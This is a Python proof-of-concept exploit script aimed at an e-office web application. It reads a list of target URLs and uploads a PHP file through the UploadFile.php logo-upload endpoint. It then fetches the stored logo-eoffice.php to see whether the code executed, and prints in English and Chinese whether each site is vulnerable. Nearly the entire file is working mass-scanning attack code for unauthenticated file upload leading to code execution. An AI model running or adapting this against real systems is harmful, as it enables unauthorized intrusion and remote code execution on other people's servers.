import requests
import urllib3
from urllib import parse

requests.packages.urllib3.disable_warnings()

def poc():
	for url in open("target.txt"):
		url=url.strip()
		path="/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
		vulnurl=url + path
		#print(vulnurl)
		headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",      
    }
		phpinfo='''<?php phpinfo();?>

'''
		file={"Filedata":("test.php",phpinfo)}
		try:
			res=requests.post(vulnurl,files=file,headers=headers,verify=False,timeout=5)
			res_url=requests.get(url=url+"/images/logo/logo-eoffice.php")
			#print(res_url.text) print logo返回值
			if "system" in res_url.text and res_url.status_code==200:
				print(url+"is vuln 漏洞存在")
			else:
				print(url+"is not vuln 漏洞不存在")
		except Exception as e:
			print(e)

if __name__ == '__main__':
    poc()
